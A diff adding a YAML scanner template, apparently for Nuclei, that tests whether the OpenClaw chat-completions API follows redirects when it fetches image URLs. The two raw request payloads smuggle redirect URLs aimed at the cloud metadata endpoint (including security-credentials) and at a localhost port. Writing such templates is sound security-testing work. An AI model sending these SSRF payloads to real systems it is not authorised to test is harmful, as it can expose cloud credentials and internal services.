@@ -1,0 +1,83 @@
+http:
+- matchers:
+  - condition: or
+    part: body
+    type: word
+    words:
+    - ami-id
+    - security-credentials
+    - instance-id
+    - iam
+    - meta-data
+  - condition: or
+    part: body
+    type: word
+    words:
+    - ECONNREFUSED
+    - ENOTFOUND
+    - ETIMEDOUT
+    - connect EHOSTUNREACH
+  matchers-condition: or
+  raw:
+  - 'POST /v1/chat/completions HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+
+    {"model":"default","messages":[{"role":"user","content":[{"type":"text","text":"Describe
+    this image"},{"type":"image_url","image_url":{"url":"http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/"}}]}]}
+
+    '
+- matchers:
+  - condition: or
+    part: body
+    type: word
+    words:
+    - ok
+    - healthy
+    - status
+  - condition: or
+    part: body
+    type: word
+    words:
+    - ECONNREFUSED
+    - 127.0.0.1
+    - localhost
+  matchers-condition: or
+  raw:
+  - 'POST /v1/chat/completions HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+
+    {"model":"default","messages":[{"role":"user","content":[{"type":"text","text":"Describe
+    this image"},{"type":"image_url","image_url":{"url":"http://httpbin.org/redirect-to?url=http://127.0.0.1:18789/healthz"}}]}]}
+
+    '
+id: openclaw-ssrf-dns-rebind
+info:
+  author: LobsterGuard
+  description: 'Tests whether OpenClaw follows HTTP redirects when fetching external
+
+    resources (e.g. image_url in chat completions), allowing an attacker
+
+    to redirect the server to internal services. The redirect chain
+
+    targets the cloud metadata endpoint (169.254.169.254) which should
+
+    be blocked by SSRF protections. If the server follows the redirect
+
+    or returns internal error details, SSRF filtering is incomplete.
+
+    '
+  metadata:
+    chain_id: 44
+  name: OpenClaw SSRF via Redirect-Based DNS Rebinding
+  reference:
+  - https://github.com/lobster-guard/openclaw-security
+  severity: high
+  tags: openclaw,ssrf,dns-rebinding,redirect
